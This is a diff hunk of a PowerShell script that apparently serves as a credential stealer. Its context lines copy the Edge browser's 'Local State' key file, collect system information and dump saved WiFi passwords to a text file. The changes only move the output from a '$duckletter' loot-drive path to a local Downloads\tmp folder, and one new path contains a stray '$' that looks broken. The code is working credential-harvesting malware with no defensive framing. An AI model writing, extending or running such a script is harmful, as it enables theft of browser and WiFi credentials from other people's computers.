@@ -52,7 +52,7 @@ Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destin
 
 # Gather additional system information
 function GatherSystemInfo {
-    $sysInfoDir = "$duckletter\$env:USERNAME\SystemInfo"
+    $sysInfoDir = "$C:\Users\$env:UserName\Downloads\tmp\SystemInfo"
     if (-Not (Test-Path $sysInfoDir)) {
         New-Item -ItemType Directory -Path $sysInfoDir
     }
@@ -86,7 +86,7 @@ function GetWifiPasswords {
     $results | Format-Table -AutoSize
 
     # Save results to a file
-    $results | Out-File -FilePath "$duckletter\$env:USERNAME\WiFi_Details.txt"
+    $results | Out-File -FilePath "C:\Users\$env:UserName\Downloads\tmp\WiFi_Details.txt"
 }
 
 GetWifiPasswords
